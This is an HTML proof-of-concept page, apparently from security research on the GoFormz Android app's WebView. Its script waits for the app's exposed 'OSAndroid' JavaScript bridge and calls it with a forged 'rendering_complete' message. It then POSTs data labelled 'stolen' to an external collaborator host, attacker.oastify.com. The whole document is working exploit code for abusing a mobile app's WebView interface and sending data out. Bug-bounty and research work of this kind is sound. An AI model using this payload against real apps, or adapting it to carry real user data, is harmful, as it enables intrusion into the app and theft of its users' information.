<!DOCTYPE html>
<html>
  <head>
    <title>GoFormz WebView PoC</title>
    <script>
      let attempts = 0;
      const maxAttempts = 20;

      const interval = setInterval(() => {
        attempts++;
        if (window.OSAndroid && typeof OSAndroid.postMessage === 'function') {
          clearInterval(interval);

          // Tell the app the view is ready
          OSAndroid.postMessage(JSON.stringify({ type: "rendering_complete" }));

          // Now send data to collaborator
          fetch("https://attacker.oastify.com", {
            method: "POST",
            body: JSON.stringify({ stolen: "XSS executed successfully" }),
          });
        }

        if (attempts > maxAttempts) {
          clearInterval(interval);
          alert("Timed out waiting for OSAndroid interface");
        }
      }, 500);
    </script>
  </head>
  <body>
    <h1>Loading...</h1>
  </body>
</html>

